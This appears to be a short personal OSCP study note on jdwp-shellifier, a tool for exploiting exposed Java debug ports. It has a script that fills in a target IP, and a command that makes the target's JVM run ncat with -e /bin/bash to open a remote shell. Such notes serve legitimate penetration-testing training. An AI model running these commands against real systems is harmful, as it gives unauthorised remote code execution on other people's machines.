https://github.com/IOActive/jdwp-shellifier/tree/master

jdwp-shellifier.py
```
cd ~/Desktop/Tools
```

To target a specific host/port:
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `python ./jdwp-shellifier.py -t ${ip} -p 1234`;

dv.paragraph("```bash\n" + command + "\n```");
```
This command will only inject Java code on the JVM and show some info like Operating System, Java version. Since it does not execute external code/binary, it is totally safe and can be used as Proof-Of-Concept

```
$ python ./jdwp-shellifier.py -t my.target.ip -p 1234 --cmd "ncat -v -l -p 1234 -e /bin/bash"
```

This command will actually execute the process `ncat` with the specified argument with the rights given to the running JVM.